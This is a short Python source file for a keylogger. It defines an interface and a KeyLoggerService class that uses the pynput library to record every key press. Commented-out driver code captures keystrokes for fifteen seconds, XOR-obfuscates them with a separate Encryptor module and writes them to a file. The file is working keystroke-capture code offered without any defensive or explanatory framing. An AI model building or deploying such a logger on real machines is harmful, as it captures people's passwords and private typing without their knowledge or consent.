from abc import ABC, abstractmethod
from typing import List
from pynput import keyboard
import Writer
import Encryptor
import time


class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass

    @abstractmethod
    def stop_logging(self) -> None:
        pass

    @abstractmethod
    def get_logged_keys(self) -> List[str]:
        pass


class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.keys = []
        self.listener = None

    def on_press(self, key):
        try:
            self.keys.append(key.char)
        except AttributeError:
            self.keys.append(" {" + str(key) + "} " )

    def start_logging(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()

    def get_logged_keys(self) -> str:
        # print(self.keys)
        return "".join(c for c in self.keys)


# w = Writer.FileWriter('myFile.txt')
# e = Encryptor.Encryptor(5)
# l = KeyLoggerService()
#
# l.start_logging()
# time.sleep(15)
# l.stop_logging()
# w.write_to_file(e.xor_encrypt(l.get_logged_keys()))
# # print(l.get_logged_keys())
# n = e.xor_encrypt(l.get_logged_keys())
# print(n)
# print(e.xor_decrypt(n))





